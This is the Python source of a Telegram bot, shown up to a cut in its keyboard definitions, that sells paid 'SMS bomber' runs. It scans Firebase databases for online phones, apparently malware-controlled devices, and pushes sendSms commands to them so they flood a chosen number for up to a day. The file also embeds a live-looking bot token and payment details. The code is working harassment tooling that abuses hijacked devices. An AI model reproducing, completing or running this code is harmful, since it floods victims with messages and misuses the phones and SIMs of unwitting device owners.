# 🗿 Bot Developer - @GOD_AYUSH
# 🔰 Developer Channel - @Ayush_Hackz
# ⚡ AYUSH SMS BOMBER v8.5 — PRO MAX EDITION
# 🚀 High-Performance | Multi-Worker | MongoDB-Ready | 700+ SMS/min

import warnings
warnings.filterwarnings("ignore", category=ResourceWarning)
import asyncio, json, os, time, logging, random, string, threading, sys, hashlib
from datetime import datetime, timedelta
from copy import deepcopy
from collections import defaultdict, deque
from urllib.parse import quote
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field

import aiohttp
from aiohttp import web, TCPConnector
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile,
    InputMediaPhoto, InputMediaVideo, InputMediaAudio, InputMediaDocument
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("AyushBlastPro")

# ═══════════════════════════════════════════════════════════════
# ║  PREMIUM EMOJI IDs
# ═══════════════════════════════════════════════════════════════
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"
EMOJI_TOP = "6237927637906364256"

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    display_text = text
    if sc(text).lower() == "sᴛᴀʀᴛ" or text.lower() == "start":
        display_text = "AYUSH"
    
    label = f"{fallback_emoji} {sc(display_text)}".strip() if (fallback_emoji and not emoji_id) else sc(display_text)
    
    button = InlineKeyboardButton(text=label, callback_data=callback_data)
    if emoji_id:
        try:
            button.icon_custom_emoji_id = emoji_id
        except Exception:
            pass
    if style:
        try:
            setattr(button, "style", style)
        except Exception:
            pass
    return button

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    display_text = text
    if sc(text).lower() == "sᴛᴀʀᴛ" or text.lower() == "start":
        display_text = "AYUSH"
    label = f"{fallback_emoji} {sc(display_text)}".strip() if (fallback_emoji and not emoji_id) else sc(display_text)
    if emoji_id:
        return InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, url=url)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=text, request_contact=request_contact, request_location=request_location)
    if style in ["primary", "success", "danger"]:
        try:
            setattr(kb_btn, "style", style)
        except Exception:
            pass
    return kb_btn

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("AYUSH", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

# ═══════════════════════════════════════════════════════════════
# ║  CONFIG — EDIT THESE
# ═══════════════════════════════════════════════════════════════
MAIN_OWNER = 7758917200
SUPER_ADMIN_NAME = "@GOD_AYUSH"
SUPER_ADMIN_LINK = "https://t.me/GOD_AYUSH"
SUPER_ADMINS = [7758917200]

BOT_TOKEN = "9161478208:AAGNZg7GTR6gEyqiaZwDwNsTsLec4WjmLcs"
LOG_CHANNEL_ID = -1003986900080

_DATA_FILE = "blast_data.json"
_BACKUP_FIREBASE_FILE = "firebase.txt"
_VERSION = "v8.5-PRO-MAX"

_SEND_DELAY = 0.05
_PROGRESS_UPDATE_INTERVAL = 0.8
_BACKGROUND_SCAN_INTERVAL = 45.0
_MAX_CONCURRENT_SENDS = 50
_FIREBASE_TIMEOUT = 8
_HTTP_POOL_LIMIT = 200
_HTTP_POOL_PER_HOST = 40

SPEED_FAST = 0.04
SPEED_MEDIUM = 0.15
SPEED_SLOW = 0.35
SPEED_DEFAULT = SPEED_FAST

WEBAPP_HOST = "0.0.0.0"
WEBAPP_PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_PATH = "/webhook"
WEBHOOK_URL = "https://ayush-bomberrrr.onrender.com"

DEFAULT_UPI_ID = "ayush.sharma798@fam"
DEFAULT_UPI_NAME = "AYUSH SMS BOMBER"

# ═══════════════════════════════════════════════════════════════
# ║  GLOBAL RATE LIMITER & HTTP SESSION
# ═══════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, max_calls: int = 5, period: float = 2.0):
        self.max_calls = max_calls
        self.period = period
        self.calls: Dict[int, deque] = defaultdict(lambda: deque())

    def is_allowed(self, uid: int) -> bool:
        now = time.time()
        dq = self.calls[uid]
        while dq and dq[0] < now - self.period:
            dq.popleft()
        if len(dq) >= self.max_calls:
            return False
        dq.append(now)
        return True

GLOBAL_LIMITER = RateLimiter(max_calls=8, period=2.0)
BLAST_LIMITER = RateLimiter(max_calls=1, period=5.0)

_HTTP_SESSION: Optional[aiohttp.ClientSession] = None

async def get_http_session() -> aiohttp.ClientSession:
    global _HTTP_SESSION
    if _HTTP_SESSION is None or _HTTP_SESSION.closed:
        connector = TCPConnector(
            limit=_HTTP_POOL_LIMIT,
            limit_per_host=_HTTP_POOL_PER_HOST,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            force_close=False
        )
        _HTTP_SESSION = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=_FIREBASE_TIMEOUT)
        )
    return _HTTP_SESSION

# ═══════════════════════════════════════════════════════════════
# ║  DATA LAYER
# ═══════════════════════════════════════════════════════════════
_DATA_LOCK = asyncio.Lock()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "backup_firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 0},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": [], "upi_id": DEFAULT_UPI_ID, "upi_name": DEFAULT_UPI_NAME},
        "redeem_codes": {},
        "settings": {
            "ref_credits": 0,
            "welcome_credits": 0,
            "max_owners": 6
        },
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "top_video": None,
        "buy_requests": {},
        "admin_notes": {}
    }

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if "pricing" in data:
                data["pricing"].setdefault("upi_id", DEFAULT_UPI_ID)
                data["pricing"].setdefault("upi_name", DEFAULT_UPI_NAME)
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                u.setdefault("credits", 0)
                u.setdefault("sms_history", [])
                u.setdefault("welcome_claimed", False)
            data.setdefault("buy_requests", {})
            data.setdefault("backup_firebases", [])
            data.setdefault("top_video", None)
            data.setdefault("admin_notes", {})
            data.setdefault("settings", {})
            data["settings"].setdefault("welcome_credits", 0)
            data["settings"].setdefault("ref_credits", 0)
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    try:
        tmp = _DATA_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
        os.replace(tmp, _DATA_FILE)
    except Exception as e:
        log.error(f"Save error: {e}")

def load_backup_firebases() -> list:
    result = []
    if not os.path.exists(_BACKUP_FIREBASE_FILE):
        return result
    try:
        with open(_BACKUP_FIREBASE_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "|" in line:
                    parts = line.split("|", 1)
                    label = parts[0].strip()
                    url = parts[1].strip()
                else:
                    url = line
                    label = url.replace("https://", "").replace("http://", "").split(".")[0][:24]
                if not (url.startswith("http://") or url.startswith("https://")):
                    continue
                url = url.rstrip("/")
                fb_id = "BP" + hashlib.md5(url.encode()).hexdigest()[:10]
                result.append({
                    "id": fb_id,
                    "url": url,
                    "label": label,
                    "added_at": int(time.time()),
                    "source": "backup_file"
                })
    except Exception as e:
        log.error(f"firebase.txt load error: {e}")
    return result

def get_all_firebases(d: dict) -> list:
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    seen = {}
    merged = []
    for fb in bot_fbs:
        u = fb["url"].rstrip("/")
        if u not in seen:
            seen[u] = True
            merged.append(fb)
    for fb in backup_fbs:
        u = fb["url"].rstrip("/")
        if u not in seen:
            seen[u] = True
            merged.append(fb)
    return merged

# ═══════════════════════════════════════════════════════════════
# ║  USER / ROLE HELPERS
# ═══════════════════════════════════════════════════════════════
def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": [],
            "welcome_claimed": False
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1500:
        d["activity_log"] = d["activity_log"][-1500:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 0)
    if ref_credits > 0:
        add_credits(new_uid, ref_credits, d)
        add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    if ref_credits <= 0:
        return True, f"{em(EMOJI_GIFT, '🎉')} ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋᴇᴅ! (ᴄʀᴇᴅɪᴛs ᴏғғ)", referrer_uid
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

# ═══════════════════════════════════════════════════════════════
# ║  FIREBASE API LAYER
# ═══════════════════════════════════════════════════════════════
CACHED_DEVICES: List[dict] = []
FB_HEALTH: Dict[str, dict] = {}
LAST_SCAN_TIME = 0.0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
SCAN_LOCK = asyncio.Lock()
FB_DEVICE_COUNTS: Dict[str, dict] = {}

def _update_fb_health(fb_id: str, ok: bool, latency: float):
    h = FB_HEALTH.setdefault(fb_id, {"sent": 0, "fail": 0, "latency": 0.0, "last": 0})
    if ok:
        h["sent"] += 1
    else:
        h["fail"] += 1
    h["latency"] = (h["latency"] * 0.7) + (latency * 0.3)
    h["last"] = time.time()

async def fb_get(base_url: str, path: str, timeout: int = _FIREBASE_TIMEOUT) -> dict:
    url = base_url.rstrip("/") + path
    t0 = time.time()
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                _update_fb_health(base_url, True, time.time() - t0)
                if txt == "null" or not txt:
                    return {}
                return json.loads(txt)
    except Exception as e:
        _update_fb_health(base_url, False, time.time() - t0)
    return {}

async def fb_put(base_url: str, path: str, payload: dict, retries: int = 2) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(retries):
        t0 = time.time()
        try:
            session = await get_http_session()
            async with session.put(
                url, json=payload, timeout=aiohttp.ClientTimeout(total=6)
            ) as r:
                ok = 200 <= r.status < 300
                _update_fb_health(base_url, ok, time.time() - t0)
                if ok:
                    return True
        except Exception as e:
            _update_fb_health(base_url, False, time.time() - t0)
        await asyncio.sleep(0.15 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def _fetch_one_device(session: aiohttp.ClientSession, fb: dict, dev_id: str, sem: asyncio.Semaphore) -> Optional[dict]:
    async with sem:
        try:
            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                if r.status != 200:
                    return None
                txt = (await r.text()).strip()
                if txt == "null" or not txt:
                    return None
                dev_data = json.loads(txt)
                if isinstance(dev_data, dict) and device_is_online(dev_data):
                    name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                    sims = dev_data.get("sims", [])
                    return {
                        "fb_id": fb["id"],
                        "fb_url": fb["url"],
                        "fb_label": fb.get("label", fb["url"][:30]),
                        "dev_id": dev_id,
                        "dev_name": name,
                        "sims": sims,
                    }
        except Exception:
            pass
    return None

async def get_all_online_devices(d: dict) -> list:
    fbs = get_all_firebases(d)
    if not fbs:
        return []
    results = []
    session = await get_http_session()
    device_sem = asyncio.Semaphore(80)
    
    async def fetch_one_fb(fb: dict):
        try:
            shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
            async with session.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200:
                    return
                txt = (await r.text()).strip()
                if txt == "null" or not txt:
                    return
                device_ids = json.loads(txt)
                if not isinstance(device_ids, dict):
                    return
                dev_ids = list(device_ids.keys())
                for i in range(0, len(dev_ids), 40):
                    batch = dev_ids[i:i+40]
                    tasks = [_fetch_one_device(session, fb, did, device_sem) for did in batch]
                    batch_res = await asyncio.gather(*tasks, return_exceptions=True)
                    for res in batch_res:
                        if res and not isinstance(res, Exception):
                            results.append(res)
        except Exception as e:
            pass
    
    fb_sem = asyncio.Semaphore(100)
    async def guarded(fb):
        async with fb_sem:
            await fetch_one_fb(fb)
    
    await asyncio.gather(*(guarded(fb) for fb in fbs), return_exceptions=True)
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

# ═══════════════════════════════════════════════════════════════
# ║  BACKGROUND SCANNER
# ═══════════════════════════════════════════════════════════════
async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS
    log.info("✅ Background Firebase Scanner STARTED (45s interval)")
    first_scan_done = False
    
    while True:
        try:
            async with SCAN_LOCK:
                if SCANNING_IN_PROGRESS:
                    await asyncio.sleep(3)
                    continue
                SCANNING_IN_PROGRESS = True
            
            SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
            t_start = time.time()
            
            d = load()
            try:
                file_mtime = os.path.getmtime(_BACKUP_FIREBASE_FILE) if os.path.exists(_BACKUP_FIREBASE_FILE) else 0
                last_loaded = d.get("_backup_mtime", 0)
                if file_mtime > last_loaded:
                    backup = load_backup_firebases()
                    if backup:
                        d["backup_firebases"] = backup
                        d["_backup_mtime"] = file_mtime
                        save(d)
            except Exception as e:
                pass
            
            fbs = get_all_firebases(d)
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue
            
            devices = await get_all_online_devices(d)
            CACHED_DEVICES = devices
            
            new_counts = {}
            for fb in fbs:
                fb_id = fb["id"]
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                new_counts[fb_id] = {
                    "label": fb.get("label", fb["url"][:30]),
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            FB_DEVICE_COUNTS.clear()
            FB_DEVICE_COUNTS.update(new_counts)
            LAST_SCAN_TIME = time.time()
            
            dur = time.time() - t_start
            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs | {dur:.1f}s"
                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>Scanner Active!</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} Devices: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} DBs: <b>{len(fbs)}</b>",
                            parse_mode="HTML"
                        )
                    except: pass
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs | {dur:.1f}s"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:25]}"
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
            await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    n = len(CACHED_DEVICES)
    diff = time.time() - LAST_SCAN_TIME
    if diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {n} ᴅᴇᴠɪᴄᴇs"
    elif diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {n} ᴅᴇᴠɪᴄᴇs ({int(diff/60)}ᴍ)"
    return f"{em(EMOJI_CROSS, '🔴')} {n} ᴅᴇᴠɪᴄᴇs ({int(diff/60)}ᴍ)"

# ═══════════════════════════════════════════════════════════════
# ║  FORCE JOIN
# ═══════════════════════════════════════════════════════════════
async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [f"{em(EMOJI_CROSS, '⛔')} <b>Join karein pehle!</b>\n"]
    for ch in missing:
        lines.append(f"• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n<i>Join ke baad /start karein.</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ═══════════════════════════════════════════════════════════════
# ║  UTIL / FMT
# ═══════════════════════════════════════════════════════════════
def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ FAST") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ᴋᴇ ʟɪʏᴇ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

# ═══════════════════════════════════════════════════════════════
# ║  SESSIONS & FSM STATES
# ═══════════════════════════════════════════════════════════════
class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid', 'rate']
    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None
        self.rate = 0.0

USER_SESSIONS: Dict[int, UserSession] = {}
SESSIONS_LOCK = asyncio.Lock()
PROTECTED_NUMBERS: Dict[str, int] = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    send_custom_duration = State() # Added for custom time in count/duration
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_type = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    set_welcome_credits = State()
    set_upi_id = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    add_top_video = State()
    add_top_video_caption = State()
    buy_ss = State()
    admin_note_uid = State()
    admin_note_text = State()

# ═══════════════════════════════════════════════════════════════
# ║  KEYBOARDS (WITH 10 DURATION/COUNT BUTTONS & COLORFUL STYLES)
# ═══════════════════════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("ғᴀsᴛ (700+/ᴍɪɴ)", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success")],
        [
            btn("ᴍᴇᴅɪᴜᴍ (400/ᴍɪɴ)", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ (170/ᴍɪɴ)", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="danger"),
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")]
    ])

def duration_kb(prefix: str) -> InlineKeyboardMarkup:
    """10 colorful buttons matching SS screenshot 1"""
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("⚡ 1 ᴍɪɴ (500 ᴄʀ)", f"{prefix}:dur:1m", EMOJI_ROCKET, "⚡", style="success"),
            btn("⚡ 5 ᴍɪɴ (2ᴋ ᴄʀ)", f"{prefix}:dur:5m", EMOJI_ROCKET, "⚡", style="success")
        ],
        [
            btn("⚡ 10 ᴍɪɴ (5ᴋ ᴄʀ)", f"{prefix}:dur:10m", EMOJI_STAR, "⚡", style="primary"),
            btn("⚡ 30 ᴍɪɴ (50ᴋ ᴄʀ)", f"{prefix}:dur:30m", EMOJI_STAR, "⚡", style="primary")
        ],
        [
            btn("⏱ 1 ʜʀ (100ᴋ ᴄʀ)", f"{prefix}:dur:1h", EMOJI_PHONE, "⏱", style="primary"),
            btn("⏱ 6 ʜʀ (180ᴋ ᴄʀ)", f"{prefix}:dur:6h", EMOJI_PHONE, "⏱", style="primary")
        ],
        [
            btn("⏱ 12 ʜʀ (360ᴋ ᴄʀ)", f"{prefix}:dur:12h", EMOJI_GEAR, "⏱", style="primary"),
            btn("📅 1 ᴅᴀʏ (720ᴋ ᴄʀ)", f"{prefix}:dur:1d", EMOJI_GEAR, "📅", style="primary")
        ],
        [
